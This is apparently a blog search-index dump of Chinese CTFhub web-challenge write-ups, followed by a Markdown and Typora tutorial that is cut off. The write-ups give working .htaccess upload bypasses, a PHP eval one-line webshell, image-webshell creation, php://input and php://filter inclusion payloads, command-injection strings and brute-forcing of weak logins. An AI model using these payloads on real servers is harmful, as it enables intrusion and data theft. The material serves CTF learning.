限制任何用户访问基于该IP地址的特定网页的整个网站。可以简单地允许我们的安全页面仅从特定的ips访问。在这种情况下，如果任何用户试图从未经授权的页面访问安全页面都将获得错误页面。\n5、更改网址\n.htaccess广泛用于更改网站的URL，使其简单易用。我们可以轻松转换在网络浏览器中显示的网址。\n具体实现：\n1、上传.htaccess文件至服务器上传目录，此时apache在解析该目录下的php时将按照文件要求。只要文件名匹配到所定义的字符串，就会将该文件当作php解析。\n\n&lt;FilesMatch &quot;shana&quot;&gt;\nSetHandler application&#x2F;x-httpd-php\n&lt;&#x2F;FilesMatch&gt;\n\n2、上传.htaccess文件设置的关键字的文件名，即上传一个黑名单没有过滤的随意后缀名文件，但文件名中一定要包含shana，如&quot;shana.jpg&quot;，内容为一句话木马。此时&quot;shana.jpg&quot;会被Apache当作php解析。\n————————————————\n版权声明：本文为CSDN博主「欧阳大仙萌萌哒」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;shana_8&#x2F;article&#x2F;details&#x2F;104827642\n\n\n\n开始做题思路1\n根据htaccess文件的特性，这道题可以重写文件的解析规则进行绕过。先上传一个名为.htaccess文件，将原有的文件替换掉。其内容如上\n\n上传.htaccess,此时有111的文件当作php文件解析。\n\n试着上传111.php\n\n发现不匹配\n将111.php改为不在黑名单中的后缀名\n\n上传成功\n\n蚁剑连接\n\n思路2\nAddType application&#x2F;x-httpd-php .txt\n\n意思是将.txt后缀的文件当成php解析\n上传该文件\n再上传111.txt\n\n连接蚁剑\n\n5.文件上传漏洞之文件头检查前置知识\n文件头检查是指当浏览器上传到服务器的时候，白名单进行的文件头检测，符合，则允许上传，否则不允许上传。\n\t我们都知道，文件的扩展名是用来识别文件类型的。通过给他指定扩展名，我们可以告诉自己，也告诉操作系统我们想用什么方式打开这个文件。比如我么会把.jpg的文件默认用图片显示软件打开，.zip 文件会默认用解压软件打开等等。\n  然而，扩展名完全是可以随便改改的。我们可以给文件设置一个任意的扩展名，当然也可以不设置扩展名。这样一来我们就不能了解到这个文件究竟是做什么的，究竟是个什么样的文件。我们或许也会疑惑，为什么一个软件，比如视频播放器，就能用正确的方式打开.mp4 .rmvb .wmv 等等的视频？\n  事实上，所有的文件都是以二进制的形式进行存储的，本质上没有差别。之所以使用的方法不同，只是因为我们理解他的方式不同。**在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。**\n  文件签名一般都在文件的头部，如果你用十六进制方式查看文件，你就可以看到文件的一些签名信息。如用uestudio工具以十六进制方式查看zip格式的文件，其文件内容头部有50 4B 03 04这样的十六进制信息。同理jpg文件状况有FF D8 FF E0 xx xx 4A 46这样的十六进制信息，其实这此十六进制都是表示一些特殊字条。\n  Linux下我们可以用file命令直接查看文件的实际格式，但是他本质上也是利用文件头标志来进行文件类型判断的。下面就简要介绍下手动判断文件真实类型的方法。\n————————————————\n版权声明：本文为CSDN博主「剑客 getshell」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_45588247&#x2F;article&#x2F;details&#x2F;119592213\n\n\n\n直接做题按照惯例直接上传\n\n根据题目，应该是要做一个图片马，因为检测的是文件头，而不是后缀名\n我们先创造一个名为1.png的图片，然后写一个名为1.php的一句话代码，把他们放到同一目录下，用cmd生成一个名为2.php的图片马\ncopy 1.png&#x2F;b + 1.php&#x2F;a 2.php\n\n命令解释:\n使用CMD制作一句话木马。\n参数&#x2F;b指定以二进制格式复制、合并文件; 用于图像类&#x2F;声音类文件\n参数&#x2F;a指定以ASCII格式复制、合并文件。用于txt等文档类文件\ncopy 1.jpg&#x2F;b+1.php 2.jpg \n&#x2F;&#x2F;意思是将1.jpg以二进制与1.php合并成2.jpg\n那么2.jpg就是图片木马了。\n\n\n\n\n\n修改格式\n\n\n再用蚁剑连接\n\n方法二\n制作一个图片马\n\n上传,抓包,改后缀\n\n成功\n\n蚁剑连接成功\n\n6.文件上传之前端验证前置知识漏洞原理​\tWeb应用系统虽然对用户上传的文件进行了校验，但是校验是通过前端javascript代码完成的。由于恶意用户可以对前端javascript进行修改或者是通过抓包软件篡改上传的文件，就会导致基于js的校验很容易被绕过。\n判断是否存在前端js绕过漏洞：​\t按F12(或者:在网页空白处”右击”–&gt;选择:”检查”)打开调试面板，选择网络，然后上传图片文件和非图片文件，然后对这两个文件的变化进行对比，如果网络中没有数据变化，说明存在js前端验证漏洞，如果有变化说明不存在。(有变化说明，前端没有做验证，是把文件传输到后台，在后台进行验证的，所以才会有网络请求。)\n直接做题方法一:国际惯例\n\n查看网页源码,得知白名单\n\n直接抓包改后缀\n\n上传成功\n\n蚁剑连接成功\n\n方法二:分析前端代码得知它是用js代码实现的过滤,可以考虑直接禁用浏览器的js代码使用来绕过\n\n直接在chrome浏览器中禁用js(其他浏览器可通过插件实现)\n\n此时就能直接上传php木马了\n\n7.文件上传漏洞之无验证这题是文件上传，无验证，也就是说不会对我们上传的文件进行检测过滤，于是可以直接上传一句话木马文件\n&lt;?php\n\t$a&#x3D;$_REQUEST[1];\n\teval($a);\n?&gt;\n\n直接上传一句话木马\n\n\n蚁剑连接成功\n\n拿到flag\n\n8.签到题欢迎来到CTFhub大家庭！\n\n9.密码口令之弱口令常用的字典就是top100弱口令、top1000弱口令之类的字典\n解题思路打开看到管理后台几个大字，猜测用户名可能是admin，密码可能是password之类的\n\n先试试admin，password\n\n发现错误。。于是用bp的狙击手模式进行爆破，具体操作可以在本站找到\n\n\n\n\n\n\n\n\n\nbp攻击模式介绍\nhttps://abyssaler.github.io/post/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3\n\n简单爆破了一下，居然没有找到\n\n扩大字典范围，再次爆破\n\n爆了1w个弱口令了没爆出来，时间用完了。。。直接下一个题目吧\n10.密码口令之默认口令\n首先收集网页信息，发现是北京亿中邮公司产品，再结合题目默认口令，于是去网上搜索\n北京亿中邮信息技术有限公司邮件网关的默认口令\n\n成功破解\n\n11.信息泄露之目录遍历题目考点由于配置错误导致网站的目录可被遍历，一般该类漏洞可以为后续利用提供一些信息上的帮助\n解题思路\n直接点击开始寻找，出现这个界面\n\n挨个遍历就找到flag了\n\n\n","slug":"CTFhub之web练习","date":"2023-01-12T02:23:01.426Z","categories_index":"CTF","tags_index":"writeup","author_index":"Abyssaler"},{"id":"47fc5eb1db81ba54d8cb43c79f27163b","title":"ctfhub之RCE","content":"eval执行题目:\n所需知识:eval():把字符串 code 作为PHP代码执行。函数eval()语言结构是 非常危险的， 因为它允许执行任意 PHP 代码。 它这样用是很危险的。 如果您仔细的确认过，除了使用此结构以外 别无方法, 请多加注意，不要允许传入任何由用户 提供的、未经完整验证过的数据 。\n\n解题过程:这题根据源码其实有两种解题思路,下面挨个讲解\n解法一直接在url地址后面输入?cmd=system(&quot;ls /&quot;);切记输入；\n这里的意思就是查看根目录\n\n可以看到个flag_30217这个文件\n再用?cmd=system(&quot;cat /flag_30217&quot;);就能查看文件内容了\n\n解法二这种解法更为简单粗暴\n分析源码,这其实就是php的一句话木马,所以这里我们直接用蚁剑连接就好了,密码为cmd\n\n剩下的过程就不必我多说了\n‘“test’&quot;‘\n文件包含题目：\n解题思路if (isset($_GET[&#39;file&#39;])) &#123;\n    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;\n        include $_GET[&quot;file&quot;];\n\n重点是这段代码\n这里有一个strpos(string,find,start)函数\n这里意思在string字符串中找find的位置,start是查找的开始位置\n那么这句代码的意思就是如果file中没有flag字符串就执行下面的include $_GET[&quot;file&quot;]\n否则就输出Hacker。\nstrpos()函数strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。\n语法\nstrpos(string,find,start)\n\n参数\nstring\t必需。规定被搜索的字符串。\n\nfind\t必需。规定要查找的字符。\n\nstart\t可选。规定开始搜索的位置。\n\n返回值\n返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释： 字符串位置从 0 开始，不是从 1 开始。\n\n\n\n再看一下shell\n&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;\n\n是将ctfhub传的参数用php执行\ninclude()&#x2F;require()&#x2F;include_once()&#x2F;require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。\n输入一个文件的名字，可以直接将文件include到php文件中,这里显然是让我们把shell引入\n在hackbar中这样输入\nctfhub=system(&#39;ls /&#39;);\n\n可以看到flag\n再输入ctfhub=system(&#39;cat /flag&#39;);\n\n找到flag\nphp:&#x2F;&#x2F;input题目:\n解题思路这道题要做的事情就是，找到flag文件存储的存储的位置，然后，读取。这样的话，应该是需要命令执行的漏洞。此时php:&#x2F;&#x2F;input有一个知识点：\nphp:&#x2F;&#x2F;input\n所以我们需要使用php://input来构造发送的指令\n查看phpinfo，找到条件\n\n说明可以用php:&#x2F;&#x2F;input\n使用burp suite抓包\n方法：POST\n目标：&#x2F;?file&#x3D;php:&#x2F;&#x2F;input\nBody：&lt;?php system(&quot;ls &#x2F;&quot;); ?&gt;\n\n\n这里我写错了,应该是php://input\n\n接下来就是查看了&lt;?php system(&#39;cat /flag_10874&#39;); ?&gt;\n\n读取源代码题目:\n解题思路:试了试 php:&#x2F;&#x2F;input 发现用不了,应该是条件不允许了\n这里引入另一个php伪协议:php://filter\nphp:&#x2F;&#x2F;filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。\n\nPHP.ini：\nphp:&#x2F;&#x2F;filter在双off的情况下也可以正常使用；\nallow_url_fopen ：off&#x2F;on\nallow_url_include：off&#x2F;on\n\n\n告诉flag的位置在&#x2F;flag里，接下来就直接用php:&#x2F;&#x2F;filter提取就可以了。\n?file=php://filter/resource=/flag\n\n远程包含题目:\n解题思路:思路和前面几题基本一致\n在PHP的配置文件php.ini里将allow_url_fopen和allow_url_include设置为ON，include&#x2F;require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。\n直接用php:&#x2F;&#x2F;input进行命令执行\n\n查看flag\n\n命令注入题目：\n\n\n所需知识：如果你是大佬这段可以不看,我写出来主要是自己代码知识薄弱,方便我理解代码的意思\nexec（）函数：PHP中提供了几个调用linux命令的函数，exec、system、passthru；\n其中exec()函数用来执行一个外部程序。\nphp中的exec()函数的用法：exec()函数用于执行一个外部程序，语法为：【exec(string $command[,array &amp;$output[,int &amp;$return_var ]]);】。\n\n开启exec()函数：\nexec()函数是被禁用的，要使用这个函数必须先开启。首先是 要关掉 安全模式 safe_mode &#x3D; off。然后在看看 禁用函数列表\ndisable_ functions &#x3D; proc_ open,popen,exec,system,shell_ exec,passthru\n\n这里要把 exec 去掉，重启 apache 就OK了。\nexec()函数基本用法：\nexec(string $command [,array &amp;$output[, int &amp;$return_var]]);\n\n$command：表示要执行的命令。\n$output: 如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如  \\n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入  exec() 函数之前 对数组使用 unset() 函数进行重置。\n$return_var:如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。\n一般来说，我们只要写第一个参数，也就是$command。\n例子:\n&lt;?php\n$command &#x3D; &quot;ls &#x2F;tmp&#x2F;test&quot;; &#x2F;&#x2F;ls是linux下的查目录，文件的命令\nexec($command,$array); &#x2F;&#x2F;执行命令\nprint_r($array);\n?&gt;\n\n返回结果:\n[root@krlcgcms01 shell]# php .&#x2F;exec.php\nArray\n(\n[0] &#x3D;&gt; 1001.log\n[1] &#x3D;&gt; 10.log\n[2] &#x3D;&gt; 10.tar.gz\n[3] &#x3D;&gt; aaa.tar.gz\n[4] &#x3D;&gt; mytest\n[5] &#x3D;&gt; test1101\n[6] &#x3D;&gt; test1102\n[7] &#x3D;&gt; weblog_2010_09\n)\n\nPHP print_r() 函数:print_r() 函数用于打印变量，以更容易理解的形式展示。\n语法:\nbool print_r ( mixed $expression [, bool $return ] )\n\n参数说明：\n\n$expression: 要打印的变量，如果给出的是 string、integer 或 float 类型变量，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。\n$return: 可选，如果为 true 则不输出结果，而是将结果赋值给一个变量，false 则直接输出结果。\n\n返回值:\n$return 如果设为 true 才有返回值，为一个易于理解的字符串信息。\n解题过程：直接尝试ping百度\n\n构造payload\n127.0.0.1|ls\n\n\n可以看到疑似flag的文件\n127.0.0.1|cat 278433166717673.php\n\n没有任何结果\n\n再次构造:\n127.0.0.1|cat 278433166717673.php|base64\n\n\n再把这串代码拿去base64解码\n\n得到flag\n也可以直接用cat查看\n127.0.0.1|cat 278433166717673.php\n\n","slug":"ctfhub之RCE","date":"2023-01-12T02:23:01.424Z","categories_index":"CTF","tags_index":"writeup","author_index":"Abyssaler"},{"id":"c67086af96bd8111867fc03b2e9dfb38","title":"markdown基本操作","content":"Aurora中文章的Front-Meta属性新建文章配置\n\n\n配置选项\n默认值\n描述\n\n\n\ntitle\nMarkdown 的文件标题\n文章标题，强烈建议填写此选项\n\n\ndate\n文件创建时的日期时间\n发布时间，强烈建议填写此选项，且最好保证全局唯一\n\n\nauthor\n根 _config.yml 中的 author\n文章作者\n\n\nimg\nfeatureImages 中的某个值\n文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.\n\n\ntop\ntrue\n推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章\n\n\ncover\nfalse\nv1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中\n\n\ncoverImg\n无\nv1.0.2版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片\n\n\npassword\n无\n文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项\n\n\ntoc\ntrue\n是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项\n\n\nmathjax\nfalse\n是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行\n\n\nsummary\n无\n文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要\n\n\ncategories\n无\n文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类\n\n\ntags\n无\n文章标签，一篇文章可以多个标签\n\n\n更多markdown语法参考:\n\n\n\n\n\n\n\n\n\nhttps://github.com/Sakiyary/Markdown-Typora-VSCode-Doc\n基本功能快捷键字体操作快捷键\n\n\n功能\n快捷键\n\n\n\n字体加粗\nCtrl+B\n\n\n下划线\nCtrl+U\n\n\n倾斜\nCtrl+I\n\n\n删除线\nAlt+Shift+5\n\n\n插入功能快键键\n\n\n功能\n快键键\n\n\n\n插入图片(本地图片可直接拖入)\nCtrl+Shift+I\n\n\n插入表格\nCtrl+T\n\n\n插入有序列表\nCtrl+Shift+[\n\n\n插入无序列表\nCtrl+Shift+]\n\n\n插入超链接\nCtrl+K\n\n\n插入代码片\nCtrl+Shift+&#96;\n\n\n插入代码块\nCtrl+Shift+K\n\n\n插入公式块\nCtrl+Shift+M\n\n\n插入引用块\nCtrl+Shift+Q\n\n\n标题段落快捷键MarkDown支持六级标题，可以使用Ctrl+数字 指定不同层次的标题和段落\n\n\n\n功能\n快捷键\n\n\n\n段落（正文）\nCtrl+0\n\n\n一级标题\nCtrl+1\n\n\n二级标题\nCtrl+2\n\n\n三–六级标题(以此类推)\nCtrl+3–6\n\n\n提升标题级别\nCtrl+‘+’\n\n\n降低标题级别\nCtrl+‘-’\n\n\n拓展操作快键键表格扩展快捷键在表格中，可以使用鼠标拖动行或者列，达到交换行和列的目的\n同时也可以使用快捷键操作\n\n\n\n功能\n快捷键\n\n\n\n下方插入行\nCtrl+Enter\n\n\n上移该行\nAlt+↑\n\n\n下移该行\nAlt+↓\n\n\n左移该列\nWin键+←\n\n\n右移该列\nWin键+→\n\n\n删除该行\nCtrl+Shift+退格键(BackSpace)\n\n\n左右移动表格列的快捷键与WinDows系统自带的快捷键冲突，导致失效\n删除行快捷键，不知道为什么没有生效\n视图操作快捷键侧边栏\n\n\n功能\n快捷键\n\n\n\n大纲视图\nCtrl+Shift+1\n\n\n文件列表视图\nCtrl+Shift+2\n\n\n文件树视图\n\n\n\n显示&#x2F;隐藏侧边栏\n\n\n\n放大视图\nCtrl+Shift+‘+’\n\n\n缩小视图\nCtrl+Shift+‘-’\n\n\n恢复原来大小视图\nCtrl+Shift+9\n\n\n编辑模式\n\n\n功能\n快捷键\n\n\n\n源代码模式\nCtrl+&#x2F;\n\n\n专注模式(当前编辑行为黑，其他行为灰色)\nF8\n\n\n打字机模式(光标始终在屏幕中央位置)\nF9\n\n\n其他\n\n\n功能\n快捷键\n\n\n\n全屏\nF11\n\n\n应用内窗口切换\nCtrl+Tab\n\n\n开发者工具\nShift+F12\n\n\n搜索扩展快捷键\n\n\n功能\n快捷键\n\n\n\n查找&#x2F;搜索\nCtrl+F(好像是Ctrl+Shift+F，但这个无效)\n\n\n替换\nCtrl+H\n\n\n查找下一个\nF3\n\n\n查找上一个\nShift+F3\n\n\n基本操作快键键选择操作\n\n\n功能\n快捷键\n\n\n\n全选\nCtrl+A\n\n\n选择当前行&#x2F;句\nCtrl+L\n\n\n选择当前格式文本^ 注解1\nCtrl+E\n\n\n选择当前单词^ 注解2\nCtrl+D\n\n\n删除当前单词\nCtrl+Shift+D\n\n\n跳转操作\n\n\n功能\n快捷键\n\n\n\n跳转到文首\nCtrl+Home\n\n\n跳转到所选内容\nCtrl+J\n\n\n跳转到文末\nCtrl+End\n\n\n粘贴复制操作\n\n\n功能\n快捷键\n\n\n\n普通复制\nCtrl+C\n\n\n普通粘贴\nCtrl+V\n\n\n剪切\nCtrl+X\n\n\n复制为MarkDown标记语法\nCtrl+Shift+C\n\n\n粘贴为纯文本\nCtrl+Shift+V\n\n\n文件操作\n\n\n功能\n快捷键\n\n\n\n新建\nCtrl+N\n\n\n新建窗口(在Windows中，这两个作用一样)\nCtrl+Shift+N\n\n\n打开文件\nCtrl+O\n\n\n快速打开(在最近打开中打开)\nCtrl+P\n\n\n保存\nCtrl+S\n\n\n另存为\nCtrl+Shift+S\n\n\n偏好设置\nCtrl+，\n\n\n关闭\nCtrl+W\n\n\n重新打开关闭的文件\nCtrl+Shift+T\n\n\n其他\n\n\n功能\n快捷键\n\n\n\n清楚样式\nCtrl+\\\n\n\n增加缩进\nCtrl+]\n\n\n减少缩进\nCtrl+[\n\n\n下面的内容为了方便自己离线学习并且节省做笔记的时间,是直接复制的菜鸟教程,如想看原文可访问以下链接\n\n\n\n\n\n\n\n\n\n菜鸟教程:\nhttps://www.runoob.com/markdown/md-tutorial.html\nMarkdown 介绍\nMarkdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。\nMarkdown 语言在 2004 由约翰·格鲁伯（英语：John Gruber）创建。\nMarkdown 编写的文档可以导出 HTML 、Word、图像、PDF、Epub 等多种格式的文档。\nMarkdown 编写的文档后缀为 .md, .markdown。\n\nMarkdown 应用Markdown 能被使用来撰写电子书，如：Gitbook。\n当前许多网站都广泛使用 Markdown 来撰写帮助文档或是用于论坛上发表消息。例如：GitHub、简书、reddit、Diaspora、Stack Exchange、OpenStreetMap 、SourceForge等。\n\n编辑器本教程将使用 VSCode 编辑器来讲解 Markdown 的语法，VSCode 支持 MacOS 、Windows、Linux 平台，且包含多种主题。\nVSCode 默认集成了 Markdown 文档编辑插件，原生就支持高亮 Markdown 的语法。\nVSCode（全称：Visual Studio Code）是一款由微软开发且跨平台的免费源代码编辑器。\n\nVScode 安装教程：https://www.runoob.com/w3cnote/vscode-tutorial.html\nVScode 官网地址：https://code.visualstudio.com/\n\n\nVSCode 实时预览还需要执行 Markdown: Open Preview to the Side 命令来实现。\n在命令窗口输入 Markdown: Open Preview to the Side 命令：\n\n最终效果：\n\n如果你需要将 markdown 转为 PDF、图片、HTML 等格式也可以安装对应的插件来实现。\n你也可以使用我们的在线编辑器来测试：https://c.runoob.com/front-end/712。\n\n测试实例接下来的测试中，我们先在 VSCode 下安装 Markdown Preview Enhanced 插件来实现更强大的功能。\n点击右侧栏扩展按钮，查找Markdown Preview Enhanced 插件，点击安装：\n\n安装完成后重启 VSCode。\n在 RUNOOB.md 输入以下代码：\n# RUNOOB Markdown Test\n## Hello World!\n\n将该代码格式粘贴到文件 RUNOOB.md 上，效果如下：\n\n在预览框中右击鼠标还提供了各种导出功能：\n\nMarkdown 标题Markdown 标题有两种格式。\n1、使用 &#x3D; 和 - 标记一级和二级标题&#x3D; 和 - 标记语法格式如下：\n我展示的是一级标题\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\n我展示的是二级标题\n-----------------\n\n显示效果如下图：\n\n使用 # 号标记使用 # 号可表示 1-6 级标题，一级标题对应一个 # 号，二级标题对应两个 # 号，以此类推。\n# 一级标题\n## 二级标题\n### 三级标题\n#### 四级标题\n##### 五级标题\n###### 六级标题\n\n显示效果如下图：\n\nMarkdown 段落Markdown 段落没有特殊的格式，直接编写文字就好，段落的换行是使用两个以上空格加上回车。\n\n当然也可以在段落后面使用一个空行来表示重新开始一个段落。\n\n\n字体Markdown 可以使用以下几种字体：\n*斜体文本*\n_斜体文本_\n**粗体文本**\n__粗体文本__\n***粗斜体文本***\n___粗斜体文本___\n\n显示效果如下所示：\n\n\n分隔线你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：\n***\n\n* * *\n\n*****\n\n- - -\n\n----------\n\n显示效果如下所示：\n\n\n删除线如果段落上的文字要添加删除线，只需要在文字的两端加上两个波浪线 ~~ 即可，实例如下：\nRUNOOB.COM\nGOOGLE.COM\n~~BAIDU.COM~~\n\n显示效果如下所示：\n\n\n下划线下划线可以通过 HTML 的  标签来实现：\n&lt;u&gt;带下划线文本&lt;&#x2F;u&gt;\n\n显示效果如下所示：\n\n\n脚注脚注是对文本的补充说明。\nMarkdown 脚注的格式如下:\n[^要注明的文本]\n\n以下实例演示了脚注的用法：\n创建脚注格式类似这样 [^RUNOOB]。\n\n[^RUNOOB]: 菜鸟教程 -- 学的不仅是技术，更是梦想！！！\n\n演示效果如下：\n\nMarkdown 列表Markdown 支持有序列表和无序列表。\n无序列表使用星号(****)、加号(+)或是减号(*-**)作为列表标记，这些标记后面要添加一个空格，然后再填写内容：\n* 第一项\n* 第二项\n* 第三项\n\n+ 第一项\n+ 第二项\n+ 第三项\n\n\n- 第一项\n- 第二项\n- 第三项\n\n显示结果如下：\n\n有序列表使用数字并加上 . 号来表示，如：\n1. 第一项\n2. 第二项\n3. 第三项\n\n显示结果如下：\n\n列表嵌套列表嵌套只需在子列表中的选项前面添加两个或四个空格即可：\n1. 第一项：\n    - 第一项嵌套的第一个元素\n    - 第一项嵌套的第二个元素\n2. 第二项：\n    - 第二项嵌套的第一个元素\n    - 第二项嵌套的第二个元素\n\n显示结果如下：\n\nMarkdown 区块Markdown 区块引用是在段落开头使用 &gt; 符号 ，然后后面紧跟一个空格符号：\n&gt; 区块引用\n&gt; 菜鸟教程\n&gt; 学的不仅是技术更是梦想\n\n显示结果如下：\n\n另外区块是可以嵌套的，一个 &gt; 符号是最外层，两个 &gt; 符号是第一层嵌套，以此类推：\n&gt; 最外层\n&gt; &gt; 第一层嵌套\n&gt; &gt; &gt; 第二层嵌套\n\n显示结果如下：\n\n区块中使用列表区块中使用列表实例如下：\n&gt; 区块中使用列表\n&gt; 1. 第一项\n&gt; 2. 第二项\n&gt; + 第一项\n&gt; + 第二项\n&gt; + 第三项\n\n显示结果如下：\n\n列表中使用区块如果要在列表项目内放进区块，那么就需要在 &gt; 前添加四个空格的缩进。\n列表中使用区块实例如下：\n* 第一项\n    &gt; 菜鸟教程\n    &gt; 学的不仅是技术更是梦想\n* 第二项\n\n显示结果如下：\n\nMarkdown 代码如果是段落上的一个函数或片段的代码可以用反引号把它包起来（**&#96;**），例如：\n&#96;printf()&#96; 函数\n\n显示结果如下：\n\n代码区块代码区块使用 4 个空格或者一个制表符（Tab 键）。\n实例如下：\n\n显示结果如下：\n\n你也可以用 &#96;&#96;&#96; 包裹一段代码，并指定一种语言（也可以不指定）：\n&#96;&#96;&#96;javascript\n$(document).ready(function () &#123;\n    alert(&#39;RUNOOB&#39;);\n&#125;);\n&#96;&#96;&#96;\n\n显示结果如下：\n\nMarkdown 链接链接使用方法如下：\n[链接名称](链接地址)\n\n或者\n\n&lt;链接地址&gt;\n\n例如：\n这是一个链接 [菜鸟教程](https:&#x2F;&#x2F;www.runoob.com)\n\n显示结果如下：\n\n直接使用链接地址：\n&lt;https:&#x2F;&#x2F;www.runoob.com&gt;\n\n显示结果如下：\n\n高级链接我们可以通过变量来设置一个链接，变量赋值在文档末尾进行：\n这个链接用 1 作为网址变量 [Google][1]\n这个链接用 runoob 作为网址变量 [Runoob][runoob]\n然后在文档的结尾为变量赋值（网址）\n\n  [1]: http:&#x2F;&#x2F;www.google.com&#x2F;\n  [runoob]: http:&#x2F;&#x2F;www.runoob.com&#x2F;\n\n显示结果如下：\n\nMarkdown 图片Markdown 图片语法格式如下：\n![alt 属性文本](图片地址)\n\n![alt 属性文本](图片地址 &quot;可选标题&quot;)\n\n\n开头一个感叹号 !\n接着一个方括号，里面放上图片的替代文字\n接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上选择性的 ‘title’ 属性的文字。\n\n使用实例：\n![RUNOOB 图标](http:&#x2F;&#x2F;static.runoob.com&#x2F;images&#x2F;runoob-logo.png)\n\n![RUNOOB 图标](http:&#x2F;&#x2F;static.runoob.com&#x2F;images&#x2F;runoob-logo.png &quot;RUNOOB&quot;)\n\n显示结果如下：\n\n当然，你也可以像网址那样对图片网址使用变量:\n这个链接用 1 作为网址变量 [RUNOOB][1].\n然后在文档的结尾为变量赋值（网址）\n\n[1]: http:&#x2F;&#x2F;static.runoob.com&#x2F;images&#x2F;runoob-logo.png\n\n显示结果如下：\n\nMarkdown 还没有办法指定图片的高度与宽度，如果你需要的话，你可以使用普通的  标签。\n&lt;img decoding&#x3D;&quot;async&quot; src&#x3D;&quot;http:&#x2F;&#x2F;static.runoob.com&#x2F;images&#x2F;runoob-logo.png&quot; width&#x3D;&quot;50%&quot;&gt;\n\n显示结果如下：\n\nMarkdown 表格Markdown 制作表格使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行。\n语法格式如下：\n|  表头   | 表头  |\n|  ----  | ----  |\n| 单元格  | 单元格 |\n| 单元格  | 单元格 |\n\n以上代码显示结果如下：\n\n对齐方式\n我们可以设置表格的对齐方式：\n\n-: 设置内容和标题栏居右对齐。\n:- 设置内容和标题栏居左对齐。\n:-: 设置内容和标题栏居中对齐。\n\n实例如下：\n| 左对齐 | 右对齐 | 居中对齐 |\n| :-----| ----: | :----: |\n| 单元格 | 单元格 | 单元格 |\n| 单元格 | 单元格 | 单元格 |\n\n以上代码显示结果如下：\n\nMarkdown 高级技巧支持的 HTML 元素不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。\n目前支持的 HTML 元素有：&lt;kbd&gt; &lt;b&gt; &lt;i&gt; &lt;em&gt; &lt;sup&gt; &lt;sub&gt; &lt;br&gt;等 ，如：\n使用 &lt;kbd&gt;Ctrl&lt;&#x2F;kbd&gt;+&lt;kbd&gt;Alt&lt;&#x2F;kbd&gt;+&lt;kbd&gt;Del&lt;&#x2F;kbd&gt; 重启电脑\n\n输出结果为：\n\n转义Markdown 使用了很多特殊符号来表示特定的意义，如果需要显示特定的符号则需要使用转义字符，Markdown 使用反斜杠转义特殊字符：\n**文本加粗** \n\\*\\* 正常显示星号 \\*\\*\n\n输出结果为：\n\nMarkdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：\n\\   反斜线\n&#96;   反引号\n*   星号\n_   下划线\n&#123;&#125;  花括号\n[]  方括号\n()  小括号\n#   井字号\n+   加号\n-   减号\n.   英文句点\n!   感叹号\n\n公式Markdown Preview Enhanced 使用 KaTeX 或者 MathJax 来渲染数学表达式。\nKaTeX 拥有比 MathJax 更快的性能，但是它却少了很多 MathJax 拥有的特性。你可以查看 KaTeX supported functions&#x2F;symbols 来了解 KaTeX 支持那些符号和函数。\n默认下的分隔符：\n\n$...$ 或者 \\(...\\) 中的数学表达式将会在行内显示。\n$$...$$ 或者 \\[...\\] 或者 &#96;&#96;&#96;&#96;math&#96; 中的数学表达式将会在块内显示。\n\n\n$$\n\\begin&#123;Bmatrix&#125;\n   a &amp; b \\\\\n   c &amp; d\n\\end&#123;Bmatrix&#125;\n$$\n$$\n\\begin&#123;CD&#125;\n   A @&gt;a&gt;&gt; B \\\\\n@VbVV @AAcA \\\\\n   C @&#x3D; D\n\\end&#123;CD&#125;\n$$\n\n输出结果为：\n\ntypora 画流程图、时序图(顺序图)、甘特图复制以下代码使用 typora 的源码模式粘贴到编辑器中查看效果：\n\n以下几个实例效果图如下：\n1、横向流程图源码格式：\n&#96;&#96;&#96;mermaid\ngraph LR\nA[方形] --&gt;B(圆角)\n    B --&gt; C&#123;条件a&#125;\n    C --&gt;|a&#x3D;1| 